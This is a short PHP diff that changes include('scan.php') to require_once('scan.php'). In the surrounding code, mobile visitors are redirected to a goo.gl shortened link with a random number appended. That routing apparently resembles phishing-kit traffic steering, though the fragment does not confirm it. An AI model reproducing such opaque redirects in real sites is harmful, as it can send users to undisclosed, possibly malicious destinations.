@@ -32,7 +32,7 @@
   if($action == 'mobile'){
     header('Location: https://goo.gl/091aJP?'.rand(11111,99999));
   }else{
-    include("scan.php");
+    require_once("scan.php");
   }
 ?>
 
